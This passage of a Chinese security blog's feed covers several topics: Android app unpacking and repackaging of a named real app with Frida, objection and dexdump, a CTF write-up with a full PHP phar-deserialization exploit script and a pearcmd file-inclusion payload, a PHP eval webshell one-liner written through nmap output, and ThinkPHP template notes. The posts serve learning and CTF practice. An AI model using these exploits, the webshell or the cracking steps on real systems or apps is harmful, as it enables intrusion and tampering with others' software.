class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker objectsearch android.app.AlertDialogxxxxxxxxxx plugin plugin wallbreaker objectsearch android.app.AlertDialog</span><br></pre></td></tr></table></figure><p>就可以查看成功了，然后进行dexdump即可。</p><p>(3)和程序启动进行抢时间hook</p><p>(4)frida的两个模式：1.attach2.spawn两个模式</p><p><code>--startup-command + 命令，这样可以开软件自启动命令</code></p><p>最后记录两个生成签名和给包签名的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -alias abc.keystore -keyalg RSA -validity 20000 -keystore abc.keystore</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner  -verbose -keystore abc.keystore -signedjar testx.apk zhibo.apk abc.keystore</span><br></pre></td></tr></table></figure><h2 id="五、重打包去强升级"><a href="#五、重打包去强升级" class="headerlink" title="五、重打包去强升级"></a>五、重打包去强升级</h2><ul><li><p>DEXDump三种使用模式脱壳</p><p>1.py脚本使用</p><p>2.</p></li><li><p>Objection快速自动化定位</p></li><li><p>Wallbreaker内存可视漫游</p><p>内存中存在的实例，new String(“nihao”),GC kicak in</p></li><li><p><strong>所见即所得的代码定位思路</strong>（其实也是从开发的方向来看的）</p></li><li><p>修改源码重打包强制升级</p></li></ul><p>内存会有回收机制，但是肉眼可见的类是可以直接看到的，</p><p>hook：就是在api上挂一个钩子</p><p><strong>下面来进行实操</strong></p><p><code>青青草视频</code></p><h3 id="1-使用objection来进行链接并操作脱壳"><a href="#1-使用objection来进行链接并操作脱壳" class="headerlink" title="1.使用objection来进行链接并操作脱壳"></a>1.使用objection来进行链接并操作脱壳</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.hello.qqc explore</span><br><span class="line">plugin load &#x2F;root&#x2F;.objection&#x2F;plugins&#x2F;dexdump&#x2F;frida_dexdump</span><br><span class="line">plugin dexdump dump</span><br></pre></td></tr></table></figure><p>下载的文件自动保存到桌面下的目录<code>cd Desktop/com.hello.qqc</code></p><p>寻找主进入口：<code>grep -ril &quot;MainActivity&quot; *</code></p><h3 id="2-直接使用dexdump中的main-py来进行脱壳"><a href="#2-直接使用dexdump中的main-py来进行脱壳" class="headerlink" title="2.直接使用dexdump中的main.py来进行脱壳"></a>2.直接使用dexdump中的main.py来进行脱壳</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先把objection 跑起来，再进行运行，与壳做一手对抗</span><br><span class="line">python3 main.py </span><br><span class="line">注意这里可以指定frida的指定模式,attach 或者swap</span><br></pre></td></tr></table></figure><h3 id="3-使用pip-install"><a href="#3-使用pip-install" class="headerlink" title="3.使用pip install"></a>3.使用pip install</h3><p>直接获得命令 frida-dexdump 直接进行脱壳</p><p>然后使用下面的命令进行重打包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apktool -s d + *.apk 保留dex文件</span><br><span class="line">然后删除那个class.dex文件</span><br><span class="line">然后把脱壳之后的文件中那个dex文件进行重命名classes,classes2,classes3</span><br><span class="line">然后再更改那个入口进入的配置文件</span><br></pre></td></tr></table></figure><h3 id="真实APP实操"><a href="#真实APP实操" class="headerlink" title="真实APP实操"></a>真实APP实操</h3><ul><li><p>所谓原生就是离CPU越近，安卓就是libart.so来解释，linux原生就是原生直接解释</p></li><li><p>想要分析/破解加固，就必须从开发和加固的角度来实现</p></li><li><p>要看是不是我们要的类，就看他的结构对不对</p></li><li><p>直接乱码的数据根本没法复制的，就去进行编码，然后hook的时候再反编码回去</p><p>案例:混淆后的Okhtpp3的混淆</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安卓之旅-3&quot;&gt;&lt;a href=&quot;#安卓之旅-3&quot; class=&quot;headerlink&quot; title=&quot;安卓之旅-3&quot;&gt;&lt;/a&gt;安卓之旅-3&lt;/h2&gt;&lt;h3 id=&quot;一、解决软件会自动断掉USB链接的设置&quot;&gt;&lt;a href=&quot;#一、解决软件会自动断掉USB链接的设</summary>
      
    
    
    
    
    <category term="Android" scheme="http://example.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>安卓之旅-2</title>
    <link href="http://example.com/2020/10/06/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-2/"/>
    <id>http://example.com/2020/10/06/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-2/</id>
    <published>2020-10-06T01:16:23.000Z</published>
    <updated>2020-10-07T14:46:48.499Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android之旅2"><a href="#Android之旅2" class="headerlink" title="Android之旅2"></a>Android之旅2</h1><h2 id="一、动静态调试四大组件"><a href="#一、动静态调试四大组件" class="headerlink" title="一、动静态调试四大组件"></a>一、动静态调试四大组件</h2><p>(一)、activity </p><p>一个又一个的界面，需要在<code>manifest</code>里面注册</p><p>(二)、</p><p>(三)、service</p><p>(四)、broadcast receiver</p><h2 id="二、开始分析"><a href="#二、开始分析" class="headerlink" title="二、开始分析"></a>二、开始分析</h2><p>1.先看<code>mainactivity</code></p><p>2.receiver 注册广播，自动启动</p><p>3.二进制数据解析软件editor</p><h2 id="三、objection-初步体验"><a href="#三、objection-初步体验" class="headerlink" title="三、objection 初步体验"></a>三、objection 初步体验</h2><p><code>https://github.com/hluwa/Wallbreaker</code></p><p>葫芦娃大佬的objection的插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">objection -g + 包名 + explore</span><br><span class="line">android hooking watch class_method android.widget.Textview.setText --dump-args --dump-backtrace  --dump-return  hook 类的方法</span><br><span class="line">android hooking list activity  查看活动</span><br><span class="line">android hooking list class_methods + class name 查看类的方法</span><br><span class="line">android hooking list classes hook 类名 然后 cat .&#x2F;objection&#x2F;objection.log |grep -i 筛选该包的方法即可</span><br></pre></td></tr></table></figure><p>jadx 的体验，我就不说了，要学点开发，才能做逆向</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Android之旅2&quot;&gt;&lt;a href=&quot;#Android之旅2&quot; class=&quot;headerlink&quot; title=&quot;Android之旅2&quot;&gt;&lt;/a&gt;Android之旅2&lt;/h1&gt;&lt;h2 id=&quot;一、动静态调试四大组件&quot;&gt;&lt;a href=&quot;#一、动静态调试四大组</summary>
      
    
    
    
    
    <category term="Android" scheme="http://example.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>安卓之旅-1</title>
    <link href="http://example.com/2020/10/05/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-1/"/>
    <id>http://example.com/2020/10/05/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-1/</id>
    <published>2020-10-05T12:13:35.000Z</published>
    <updated>2020-10-11T03:37:38.314Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android-1"><a href="#Android-1" class="headerlink" title="Android-1"></a>Android-1</h1><h2 id="一、四大组件与系统架构"><a href="#一、四大组件与系统架构" class="headerlink" title="一、四大组件与系统架构"></a>一、四大组件与系统架构</h2><h3 id="（一）Android四大组件"><a href="#（一）Android四大组件" class="headerlink" title="（一）Android四大组件"></a>（一）Android四大组件</h3><p>1、Activity</p><p>一个Activity通常就是一个单独的窗口。Activity之间通过Intent进行通信。Activity应用中每一个Activity都必须要在AndroidManifest.xml配置文件中声明，否则系统将不识别也不执行该Activity。</p><p>2、Service</p><p>Started（启动）：当应用程序组件（如Activity）调用StartService()方法启动服务时，服务处于Started状态。</p><p>bound（绑定）：当应用程序组件调用bindService()方法绑定到服务时，服务处于bound状态。</p><p>Service通常位于后台运行，它一般不需要与用户交互，因此Service组件没有图形用户界面。Service组件需要继承Service基类。Service组件通常用于为其他组件提供后台服务或监控其他组件的运行状态。</p><p>3、Content provider</p><p>Android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。</p><p>只有需要在多个应用程序间共享数据是才需要内容提供者。例如，通讯录数据被多个应用程序使用，且必须存储在一个内容提供者中。它的好处是统一数据访问方式。</p><p>ContentProvider实现数据共享。ContentProvider用于保存和获取数据，并使其对所有应用程序可见。这是不同应用程序间共享数据的唯一方式，因为android没有提供所有应用共同访问的公共存储区。</p><p>开发人员不会直接使用ContentProvider类的对象，大多数是通过ContentResolver对象实现对ContentProvider的操作。5、ContentProvider使用URI来唯一标识其数据集，这里的URI以content://作为前缀，表示该数据由ContentProvider来管理。</p><p>4、Broadcast Receiver</p><p>你的应用可以使用它对外部事件进行过滤，只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力，例如闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。</p><p>广播接收者的注册有两种方法，分别是程序动态注册和AndroidManifest文件中进行静态注册。</p><p>动态注册广播接收器特点是当用来注册的Activity关掉后，广播也就失效了。静态注册无需担忧广播接收器是否被关闭，只要设备是开启状态，广播接收器也是打开着的。也就是说哪怕app本身未启动，该app订阅的广播在触发时也会对它起作用。</p><h3 id="（二）Android系统架构"><a href="#（二）Android系统架构" class="headerlink" title="（二）Android系统架构"></a>（二）Android系统架构</h3><p><code>Android</code>采用分层的架构，分为四层，从高层到底层分为<code>应用程序层</code>（app+System apps），<code>应用程序框架层</code>（Java API Framework），<code>系统运行库和运行环境层</code>(Libraries + android Runtime)和<code>Linux核心层</code>(HAL+ Linux Kernel)</p><p><img src="https://images0.cnblogs.com/blog/473657/201301/18203746-970e2cbe223e4c1c9ca129e7a2feb6c6.jpg"></p><h3 id="三-Android常用开发与逆向命令总结"><a href="#三-Android常用开发与逆向命令总结" class="headerlink" title="(三) Android常用开发与逆向命令总结"></a>(三) Android常用开发与逆向命令总结</h3><p>1、<code>file</code>查看文件属性</p><p>2、使用<code>echo</code>命令写内容到文件中，然后利用<code>cat</code>读取文件内容。</p><p>3、使用<code>dumpsys</code>命令获取当前顶层<code>activity</code>的信息，grep进行过滤，-i参数忽略大小写。</p><p>4、<code>ls -alit</code>按时间排序显示当前目录全部信息。</p><p>5、<code>dumpsys package com.termux</code>查看该APP内存中的信息</p><p>6、<code>ps -e</code>显示全部进程</p><p><code>ps -e |grep -i termux </code>筛选命令</p><p>7、dumpsys dbinfo com.termux查看数据库信息</p><p>8、<code>adb pull /sdcard/app</code>将手机中的文件拷贝到电脑当前目录下</p><p><code>adb push D:\tmp.txt /sdcard</code>将本地文件放到手机中</p><p>9、<code>adb logcat</code>查看当前日志信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat |grep -i com.termux</span><br></pre></td></tr></table></figure><p>10、指定连接某台设备的<code>adb shell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb -s 192.168.3.18:5555 shell</span><br></pre></td></tr></table></figure><p>11、查看某端口对应的进程名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">netstat -tunlp |grep 7001  # 端口</span><br><span class="line">netstat -tunlp |grep &quot;com.termux&quot; # 进程名</span><br><span class="line">netstat -aple |grep -i https #正在通信的端口，查看使用https的通信</span><br><span class="line">netstat -tuulp|grep  查看监听端口</span><br><span class="line">lsof -p + 进程ip|grep + TCP 查看监听端口</span><br></pre></td></tr></table></figure><p>12、<code>htop</code>实时查看手机进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install htop</span><br></pre></td></tr></table></figure><p>手机<code>root</code>用户查看<code>htop</code>，全部进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ su</span><br><span class="line"># &#x2F;data&#x2F;data&#x2F;com.termux&#x2F;files&#x2F;usr&#x2F;bin&#x2F;htop</span><br></pre></td></tr></table></figure><p>一本书的链接：<a href="http://yuedu.163.com/book_reader/581dbb97c3424be08ab582cf64735cde_4">http://yuedu.163.com/book_reader/581dbb97c3424be08ab582cf64735cde_4</a></p><h2 id="二、手机刷机指北"><a href="#二、手机刷机指北" class="headerlink" title="二、手机刷机指北"></a>二、手机刷机指北</h2><p><strong>环境也是分3,6,9等的</strong></p><p><strong>Frida两套环境：</strong></p><p>1、pixel(sailfish)+官方8.1.0_r1+twrp3.3.0+Magisk+Frida</p><p>2、pixel(sailfish)+twrp3.3.0+lineage16.0+addonsu16.0</p><p><strong>Xposed一套环境：</strong></p><p>1、pixel(sailfish)+官方7.1.2_r8+twrp3.2.1-0+SuperSU+XposedInstaller</p><p><strong>Fart同Aosp两套环境：</strong></p><p>1、pixel(sailfish)+最新fastboot+Fart8.1.0</p><p>2、n6p(angler)+老fastboot+Fart8.1.0</p><p><strong>Kali NetHunter一套环境：</strong></p><p>1、n6p(angler)+原生8.1.0_r1+twrp3.3.1+SuperSu</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Android-1&quot;&gt;&lt;a href=&quot;#Android-1&quot; class=&quot;headerlink&quot; title=&quot;Android-1&quot;&gt;&lt;/a&gt;Android-1&lt;/h1&gt;&lt;h2 id=&quot;一、四大组件与系统架构&quot;&gt;&lt;a href=&quot;#一、四大组件与系统架构&quot; c</summary>
      
    
    
    
    
    <category term="Android" scheme="http://example.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>巅峰极客2020</title>
    <link href="http://example.com/2020/09/28/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020/"/>
    <id>http://example.com/2020/09/28/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020/</id>
    <published>2020-09-28T07:54:28.000Z</published>
    <updated>2020-09-28T10:52:04.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020巅峰极客部分WP"><a href="#2020巅峰极客部分WP" class="headerlink" title="2020巅峰极客部分WP"></a>2020巅峰极客部分WP</h1><p>参考链接:<a href="https://www.gem-love.com/ctf/2634.html">https://www.gem-love.com/ctf/2634.html</a></p><p>主要不是题目的解答，看了颖奇大佬的文章，再根据自己在做题目的过程中记忆，对题目单纯的进行理论上的复现，原理是一样的</p><h2 id="BabyPhp2"><a href="#BabyPhp2" class="headerlink" title="BabyPhp2"></a>BabyPhp2</h2><p>打开题目</p><p><img src="https://i.loli.net/2020/09/28/V6MiunxmdfpzkEC.png"></p><p>这里提示已经很明显了，这里登陆不上的。</p><p>然后扫目录，得到<a href="http://www.zip,源码泄漏,然后打开源码,进行源码的分析/">www.zip，源码泄漏，然后打开源码，进行源码的分析</a></p><p><img src="https://i.loli.net/2020/09/28/zUTKC5ySladEGtF.png"></p><p>文件读取的漏洞，但是这个读取方法里面的有waf，魔术方法就需要制造调用，构建POP链。现在就是要找到这个链头了。</p><p><img src="https://i.loli.net/2020/09/28/Xar8jLGyDCcxM2e.png"></p><p>有一个魔术方法之中有修改的内容，可以这里是可以利用，接下来就是想办法将 这个地方包含进来还要执行这条链。剩下的就是<code>file_get_contents</code>这个函数了。利用伪协议将php文件读取进来，还要能够执行。<code>phar</code>伪协议满足要求。但是</p><p><img src="https://i.loli.net/2020/09/28/QN7ylUWLEfZrwCu.png"></p><p>已经被销毁了。这里提醒一下，伪协议是可以联合使用的。</p><p><code>compress.zlib://phar://</code></p><p>这样就可以绕过限制读取文件，再加上那个upload.php上传的时候改一个名字，问题也就解决了。下面贴上大佬的脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age&#x3D;null;</span><br><span class="line">    public $nickname&#x3D;null;</span><br><span class="line">    public $backup;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname &#x3D; new Reader();</span><br><span class="line">        $this-&gt;backup &#x3D; &quot;&#x2F;flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;token &#x3D; new User;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Reader&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$y1ng &#x3D; new dbCtrl();</span><br><span class="line"></span><br><span class="line">$phar &#x3D; new Phar(&quot;web1.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($y1ng);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">@rename(&quot;web1.phar&quot;, &quot;y1ng.gif&quot;);</span><br></pre></td></tr></table></figure><p>之后将gif上传即可</p><p><img src="https://i.loli.net/2020/09/28/2pFyVEOhMnDPSwd.png"></p><p>这里利用是否有序列化的数据出现判断是否协议生效，这样就可以调节文件路径到底是怎样的。</p><p>phar反序列参考链接：<a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p><h1 id="MeowWorld"><a href="#MeowWorld" class="headerlink" title="MeowWorld"></a>MeowWorld</h1><p>这道题有个Hint：<code>register_argc_argv</code></p><p>然后这个题很容易看出漏洞是本地文件包含，并且限制了包含的目录，就别想逃出来了。</p><p>然后就是利用pear这个包管理器，下载我们自己的马儿，然后，包含，来命令执行。</p><p><img src="https://i.loli.net/2020/09/28/yDpaCFUfLvwQm2E.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php?f&#x3D;&#x2F;usr&#x2F;share&#x2F;pear&#x2F;pearcmd&amp;+list</span><br></pre></td></tr></table></figure><p>这个就相当于在本地运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear list</span><br></pre></td></tr></table></figure><p>这样也就不难猜到提示词的用意了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2020巅峰极客部分WP&quot;&gt;&lt;a href=&quot;#2020巅峰极客部分WP&quot; class=&quot;headerlink&quot; title=&quot;2020巅峰极客部分WP&quot;&gt;&lt;/a&gt;2020巅峰极客部分WP&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a href=&quot;https://www.gem-</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>随笔小记</title>
    <link href="http://example.com/2020/09/25/%E9%9A%8F%E7%AC%94%E5%B0%8F%E8%AE%B0/"/>
    <id>http://example.com/2020/09/25/%E9%9A%8F%E7%AC%94%E5%B0%8F%E8%AE%B0/</id>
    <published>2020-09-24T23:55:27.000Z</published>
    <updated>2020-09-24T23:57:07.496Z</updated>
    
    <content type="html"><![CDATA[<h2 id="记nmap使用的几个小点"><a href="#记nmap使用的几个小点" class="headerlink" title="记nmap使用的几个小点"></a>记nmap使用的几个小点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-oN 标准保存</span><br><span class="line">-oX XML保存</span><br><span class="line">-oG Grep保存  nmap -F -oG test.txt 192.168.23.1 以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。</span><br><span class="line">-oA 保存到所有格式  nmap -F -oA test 192.168.3.2</span><br><span class="line">-append-output 补充保存文件</span><br></pre></td></tr></table></figure><h2 id="构造webshell时的小点"><a href="#构造webshell时的小点" class="headerlink" title="构造webshell时的小点"></a>构造webshell时的小点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当php，三个字被过滤时，可以使用短符号</span><br><span class="line">&lt;?&#x3D;来代替&lt;?php进行绕过</span><br></pre></td></tr></table></figure><p><code>&#39; &lt;?= @eval($_POST[&quot;cmd&quot;]);?&gt;</code> -oG shell.phtml ‘</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;记nmap使用的几个小点&quot;&gt;&lt;a href=&quot;#记nmap使用的几个小点&quot; class=&quot;headerlink&quot; title=&quot;记nmap使用的几个小点&quot;&gt;&lt;/a&gt;记nmap使用的几个小点&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ThinkPhp-5</title>
    <link href="http://example.com/2020/09/23/ThinkPhp-5/"/>
    <id>http://example.com/2020/09/23/ThinkPhp-5/</id>
    <published>2020-09-23T12:49:09.000Z</published>
    <updated>2020-09-23T15:37:59.696Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPhp-5"><a href="#ThinkPhp-5" class="headerlink" title="ThinkPhp-5"></a>ThinkPhp-5</h1><h2 id="模版的条件判断标签"><a href="#模版的条件判断标签" class="headerlink" title="模版的条件判断标签"></a>模版的条件判断标签</h2><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;switch number&#125; </span><br><span class="line">&#123;case 1&#125;1&#123;&#x2F;case&#125;</span><br><span class="line">&#123;case 5&#125;5&#123;&#x2F;case&#125;</span><br><span class="line">&#123;case 10&#125;10&#123;&#x2F;case&#125; </span><br><span class="line">&#123;default&#x2F;&#125;不存在 &#123;&#x2F;switch&#125;</span><br></pre></td></tr></table></figure><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;if ($number &gt; 10) and ($number &lt; 20)&#125;</span><br><span class="line">    6666</span><br><span class="line">&#123;else if $number &#x3D;&#x3D; 10&#125;</span><br><span class="line">    8888</span><br><span class="line">&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="present-和-notpresent-判断变量是否已经定义赋值-是否存在-；"><a href="#present-和-notpresent-判断变量是否已经定义赋值-是否存在-；" class="headerlink" title="{present}和{notpresent}判断变量是否已经定义赋值(是否存在)；"></a>{present}和{notpresent}判断变量是否已经定义赋值(是否存在)；</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;present name&#x3D;&#39;user&#39;&#125;</span><br><span class="line">存在</span><br><span class="line">&#123;&#x2F;present&#125;</span><br><span class="line">&#123;present name&#x3D;&#39;user&#39;&#125; </span><br><span class="line">user已存在 </span><br><span class="line">&#123;else&#x2F;&#125; </span><br><span class="line">user不存在 </span><br><span class="line">&#123;&#x2F;present</span><br></pre></td></tr></table></figure><h3 id="empty-和-notempty-判断变量是否为空值"><a href="#empty-和-notempty-判断变量是否为空值" class="headerlink" title="{empty}和{notempty}判断变量是否为空值"></a>{empty}和{notempty}判断变量是否为空值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;empty name&#x3D;&#39;username&#39;&#125;</span><br><span class="line">有值</span><br><span class="line">&#123;&#x2F;empty&#125;</span><br><span class="line">&#123;empty name&#x3D;&#39;username&#39;&#125; </span><br><span class="line">username 有值</span><br><span class="line">&#123;else&#x2F;&#125;</span><br><span class="line">username 没值 </span><br><span class="line">&#123;&#x2F;empty&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;defined name&#x3D;&#39;PI&#39;&#125;</span><br><span class="line">PI存在 </span><br><span class="line">&#123;else&#x2F;&#125;</span><br><span class="line">PI不存在 </span><br><span class="line">&#123;&#x2F;defined&#125;</span><br></pre></td></tr></table></figure><h2 id="模版的加载包含输出"><a href="#模版的加载包含输出" class="headerlink" title="模版的加载包含输出"></a>模版的加载包含输出</h2><h3 id="包含文件"><a href="#包含文件" class="headerlink" title="包含文件"></a>包含文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;include file&#x3D;&#39;public&#x2F;header&#39; title&#x3D;&#39;$title&#39; keywords&#x3D;&#39;模版&#39;&#x2F;&#125;</span><br><span class="line">主体</span><br><span class="line">&#123;include file&#x3D;&#39;..&#x2F;application&#x2F;view&#x2F;public&#x2F;footer.html&#39;&#125;</span><br></pre></td></tr></table></figure><p>header.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;[title]&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;头部&lt;br&gt;</span><br></pre></td></tr></table></figure><p>footer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;br&gt;尾部&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="输出替换"><a href="#输出替换" class="headerlink" title="输出替换"></a>输出替换</h3><p>运用于调用静态文件，将路径打包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在目前二级目录下，template.php 中，配置新增一个参数；</span><br><span class="line">&#39;tpl_replace_string&#39; &#x3D;&gt; [ &#39;__JS__&#39; &#x3D;&gt; &#39;static&#x2F;js&#39;, &#39;__CSS__&#39; &#x3D;&gt; &#39;static&#x2F;css&#39;, ]</span><br></pre></td></tr></table></figure><p>如果是在顶级域名下，直接在改成/static/css 即可，加一个反斜杠； </p><p>html 文件调用端，直接通过<code>__CSS__(__JS__)</code>配置的魔术方法调用即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;__CSS__&#x2F;basic.css&quot;&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;__JS__&#x2F;basic.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="模版的布局和继承"><a href="#模版的布局和继承" 